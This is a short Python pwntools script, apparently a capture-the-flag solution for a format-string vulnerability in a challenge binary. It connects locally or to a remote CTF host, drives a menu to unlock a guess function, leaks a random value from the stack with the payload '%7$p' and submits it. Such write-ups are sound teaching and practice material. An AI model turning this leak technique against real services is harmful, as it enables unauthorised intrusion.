#!/usr/bin/env python3
#03-06-2022
#Gon
#format string vuln
#Every time case 1 is called: set += 1
#when set == 4 guess me func is called 

from pwn import *
exe = ELF('./vuln')

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote('fun.chall.seetf.sg', '50001')
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

io = conn()

io.sendline(b'AAAA')
#set set==4
for i in range(8):
    io.sendline(b'1')

#leak the random number
io.sendline(b'2')
io.sendline(b'%7$p')
io.recvuntil(b'love \n')
leak=io.recvuntil(b'\n', drop=True)
leak=int(leak,16)

#call the guess function
io.sendline(b'9')
io.sendlineafter(b'number!', str(leak))
io.interactive()
